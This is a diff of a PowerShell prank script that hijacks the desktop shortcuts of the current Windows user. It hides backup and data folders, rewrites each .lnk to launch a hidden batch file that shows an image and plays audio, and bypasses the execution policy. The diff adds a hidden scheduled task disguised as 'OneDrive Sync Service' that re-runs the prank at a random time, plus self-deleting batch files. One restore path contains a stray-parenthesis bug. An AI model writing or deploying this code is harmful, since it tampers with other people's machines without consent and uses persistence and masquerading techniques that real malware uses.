@@ -1,11 +1,13 @@
-﻿if ($args -contains "without_empathy") {
+﻿# Selection mode
+
+if ($args -contains "without_empathy") {
     Write-Host "without_empathy mode activated ! ima f*ck that sh*t up !!!"
     $mode="without_empathy"
 } elseif ($args -contains "with_empathy") {
-    Write-Host "with_empathy mode activated, because he probably stronger than you i don't know"
+    Write-Host "with_empathy mode activated, because he probably stronger than you idk"
     $mode="with_empathy"
 } elseif ($args -contains "save_him_from_hell") {
-    Write-Host "At least you're alive bruh`i hope it was woth it"
+    Write-Host "At least you're alive bruh`ni hope it was worth it"
     $mode="save_him_from_hell"
 } elseif ($args -contains "wtf_is_wrong_with_you") {
     Write-Host "yoooo wtf is wrong with you ?! you probably hate him right ??"
@@ -22,14 +24,17 @@
 Set-ExecutionPolicy -Scope CurrentUser Bypass
 
 if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shrekt")) {
-
+    
+    # Get the links on the Desktop
     $links = @()
 
     if ((Test-Path "C:\Users\$($env:USERNAME)\Desktop")) {$links+=dir "C:\Users\$($env:USERNAME)\Desktop\*.lnk"}
     if ((Test-Path "C:\Users\$($env:USERNAME)\OneDrive\Desktop")){$links+=dir "C:\Users\$($env:USERNAME)\OneDrive\Desktop\*.lnk"}
 
+    # If we got at least one link...
     if($links.Count -ge 1){
-
+        
+        # Backup the links
         New-Item -ItemType Directory "C:\Users\$($env:USERNAME)\Backup" -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "C:\Users\$($env:USERNAME)\Backup" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 
@@ -44,27 +49,81 @@ if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shr
             }
         }
 
-        if (!(Test-Path "C:\Users\$($env:USERNAME)\Data\data.png")) {
+        # Install the script
+        if (!(Test-Path "C:\Users\$($env:USERNAME)\Data")) {
             New-Item -ItemType Directory "C:\Users\$($env:USERNAME)\Data" -ErrorAction SilentlyContinue
             Set-ItemProperty -Path "C:\Users\$($env:USERNAME)\Data" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+        }
+        if (!(Test-Path "C:\Users\$($env:USERNAME)\Data\image.png") -or !(Test-Path "C:\Users\$($env:USERNAME)\Data\audio.wav")) {
             Expand-Archive -Path ".\src\data.zip" -DestinationPath "C:\Users\$($env:USERNAME)\Data\"
         }
-
-        Copy-Item ".\MEGA_links.ps1" "C:\Users\$($env:USERNAME)\Data\"
-
-        New-Item -ItemType Directory "C:\Users\$($env:USERNAME)\Data\src" -ErrorAction SilentlyContinue
-        Copy-Item ".\src\data.zip" "C:\Users\$($env:USERNAME)\Data\src"
-
-        Copy-Item ".\save_him_from_hell.bat" "C:\Users\$($env:USERNAME)\Data\"
-
-        if ($mode -eq "without_empathy") {
-            "@echo off`nPowershell `"C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1`" `"get_shrekt`"`nPowershell `"C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1 `"save_him_from_hell`"`"" | Out-File "C:\Users\$($env:USERNAME)\Data\run.bat" -Encoding ascii
-        } elseif ($mode -eq "with_empathy") {
-            "@echo off`n`"C:\Users\$($env:USERNAME)\Data\data.png`"`nPowershell `"C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1 `"save_him_from_hell`"`"" | Out-File "C:\Users\$($env:USERNAME)\Data\run.bat" -Encoding ascii
-        } elseif ($mode -eq "wtf_is_wrong_with_you") {
-            "@echo off`nPowershell `"C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1`" `"get_shrekt`"`nPowershell `"C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1`" `"ah_shit..._here_we_go_again`"" | Out-File "C:\Users\$($env:USERNAME)\Data\run.bat" -Encoding ascii
+        if (!(Test-Path "C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1")) {
+            Copy-Item ".\MEGA_links.ps1" "C:\Users\$($env:USERNAME)\Data\"
+        }
+        if (!(Test-Path "C:\Users\$($env:USERNAME)\Data\src\data.zip")) {
+            New-Item -ItemType Directory "C:\Users\$($env:USERNAME)\Data\src" -ErrorAction SilentlyContinue
+            Copy-Item ".\src\data.zip" "C:\Users\$($env:USERNAME)\Data\src"
+        }
+        if (!(Test-Path "C:\Users\$($env:USERNAME)\Data\save_him_from_hell.bat")) {
+            Copy-Item ".\save_him_from_hell.bat" "C:\Users\$($env:USERNAME)\Data\"
         }
 
+        # Setup the mode
+        if ($mode -eq "without_empathy") {
+
+@"
+@echo off
+
+Powershell "C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1" "save_him_from_hell"
+
+Powershell "C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1" "get_shrekt"
+
+del /f /q "C:\Users\$($env:USERNAME)\Data\image.png"
+del /f /q "C:\Users\$($env:USERNAME)\Data\audio.wav"
+
+timeout /t 5 >nul
+del /f /q "%~f0"
+
+"@ | Out-File "C:\Users\$($env:USERNAME)\Data\run.bat" -Encoding ascii
+
+        }
+
+
+        elseif ($mode -eq "with_empathy") {
+
+@"
+@echo off
+
+Powershell "C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1" "save_him_from_hell"
+
+"C:\Users\$($env:USERNAME)\Data\image.png"
+
+del /f /q "C:\Users\$($env:USERNAME)\Data\image.png"
+del /f /q "C:\Users\$($env:USERNAME)\Data\audio.wav"
+
+timeout /t 5 >nul
+del /f /q "%~f0"
+
+"@ | Out-File "C:\Users\$($env:USERNAME)\Data\run.bat" -Encoding ascii
+
+        }
+
+
+        elseif ($mode -eq "wtf_is_wrong_with_you") {
+
+@"
+@echo off
+
+Powershell "C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1" "ah_shit..._here_we_go_again"
+
+Powershell "C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1" "get_shrekt"
+
+"@ | Out-File "C:\Users\$($env:USERNAME)\Data\run.bat" -Encoding ascii
+
+        }
+
+
+        # Change the links on the Desktop
         $WshShell = New-Object -ComObject WScript.Shell
 
         foreach ($link in $links) {
@@ -81,10 +140,15 @@ if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shr
 
 } elseif ($mode -eq "save_him_from_hell"){
     
+    # Log the recovery (in case you get an error)
     Start-Transcript "C:\Users\$($env:USERNAME)\Backup\Data_Recovery.log" -Append
 
-    foreach ($raw in (Get-Content "C:\Users\$($env:USERNAME)\Backup\links.db")) {
-        $data=@{ $raw.Split(";")[0] = $raw.Split(";")[1] }
+    # Restore where the links were
+    $data = @{}
+
+    foreach ($raw in Get-Content "C:\Users\$($env:USERNAME)\Backup\links.db") {
+        $parts = $raw.Split(";",2)
+        $data[$parts[0]] = $parts[1]
     }
 
     foreach ($id in $data.Keys) {
@@ -95,30 +159,37 @@ if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shr
     Remove-Item "C:\Users\$($env:USERNAME)\Data\save_him_from_hell.bat"
     Remove-Item "C:\Users\$($env:USERNAME)\Data\src\data.zip"
     Remove-Item "C:\Users\$($env:USERNAME)\Data\src"
-    Remove-Item "C:\Users\$($env:USERNAME)\Data\data.png"
-    Remove-Item "C:\Users\$($env:USERNAME)\Data\run.bat"
-    Remove-Item "C:\Users\$($env:USERNAME)\Data\audio.mp3"
 
-    foreach ($id in (Get-ChildItem "C:\Users\$($env:USERNAME)\Backup\")){
-        Remove-Item "C:\Users\$($env:USERNAME)\Backup\$(($id).Name)"
+    foreach ($id in $data.Keys){
+        Remove-Item "C:\Users\$($env:USERNAME)\Backup\$id"
     }
 
-    $taskName = "i'm not here"
+    # Check if the scheduled task is installed, if it is delete it
+    $taskName = "OneDrive Sync Service"
 
     if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
         Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
     }
 
+    # Delete the script
     Start-Process cmd.exe -ArgumentList "/c timeout 5 & del `"C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1`"" -WindowStyle Hidden
 
+    # stop logging
     Stop-Transcript
+
+
 
 } elseif ($mode -eq "ah_shit..._here_we_go_again") {
     
+    # Log the recovery (in case you get an error)
     Start-Transcript "C:\Users\$($env:USERNAME)\Backup\Data_Recovery.log" -Append
 
-    foreach ($raw in (Get-Content "C:\Users\$($env:USERNAME)\Backup\links.db")) {
-        $data=@{ $raw.Split(";")[0] = $raw.Split(";")[1] }
+    # Restore where the links were
+    $data = @{}
+
+    foreach ($raw in Get-Content "C:\Users\$($env:USERNAME)\Backup\links.db") {
+        $parts = $raw.Split(";",2)
+        $data[$parts[0]] = $parts[1]
     }
 
     foreach ($id in $data.Keys) {
@@ -127,12 +198,14 @@ if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shr
 
     Remove-Item "C:\Users\$($env:USERNAME)\Backup\links.db"
 
-    foreach ($id in (Get-ChildItem "C:\Users\$($env:USERNAME)\Backup\")){
-        Remove-Item "C:\Users\$($env:USERNAME)\Backup\$(($id).Name)"
+    foreach ($id in $data.Keys){
+        Remove-Item "C:\Users\$($env:USERNAME)\Backup\$id)"
     }
 
+    # Stop logging
     Stop-Transcript
 
+    # Get a random date/time
     $today = Get-Date
     $randomDays = Get-Random -Minimum 0 -Maximum 7
     $randomHour = Get-Random -Minimum 0 -Maximum 23
@@ -140,14 +213,18 @@ if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shr
 
     $randomDateTime = $today.AddDays($randomDays).Date.AddHours($randomHour).AddMinutes($randomMinute)
 
-    $taskName = "i'm not here"
+    # Set the name of the task
+    $taskName = "OneDrive Sync Service"
 
+    # Set the action of the task
     $action = New-ScheduledTaskAction `
         -Execute "powershell.exe" `
         -Argument "-NoProfile -WindowStyle Hidden -File `"C:\Users\$($env:USERNAME)\Data\MEGA_links.ps1`" `"wtf_is_wrong_with_you`""
 
+    # Set the date/time execution of the task
     $trigger = New-ScheduledTaskTrigger -Once -At $randomDateTime
 
+    # Set the settings of the task
     $settings = New-ScheduledTaskSettingsSet `
         -Hidden `
         -StartWhenAvailable `
@@ -156,10 +233,12 @@ if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shr
         -ExecutionTimeLimit (New-TimeSpan -Minutes 5) `
         -IdleDuration 30
 
+    # If the task exist, delete it
     if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
         Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
     }
 
+    # And save the new task
     Register-ScheduledTask `
         -TaskName $taskName `
         -Action $action `
@@ -170,11 +249,16 @@ if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shr
 
 } elseif ($mode -eq "get_shrekt") {
     
-    $audioPath = "C:\Users\$($env:USERNAME)\Data\audio.mp3"
-    $player = New-Object -ComObject WMPlayer.OCX
-    $player.URL = $audioPath
-    $player.controls.play()
+    # Get the audio
+    $audioPath = "C:\Users\$($env:USERNAME)\Data\audio.wav"
 
+    $player = New-Object System.Media.SoundPlayer
+    $player.SoundLocation = $audioPath
+
+    # Start the audio
+    $player.Play()
+
+    # Get the picture
     Add-Type -AssemblyName PresentationFramework
 
     $window = New-Object Windows.Window
@@ -185,11 +269,13 @@ if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shr
 
     $image = New-Object Windows.Controls.Image
     $image.Source = [Windows.Media.Imaging.BitmapImage]::new(
-        [Uri]"C:\Users\$($env:USERNAME)\Data\data.png"
+        [Uri]"C:\Users\$($env:USERNAME)\Data\image.png"
     )
     $image.Stretch = 'Uniform'
 
     $window.Content = $image
+
+    # Show the picture
     $window.ShowDialog()
 
 }
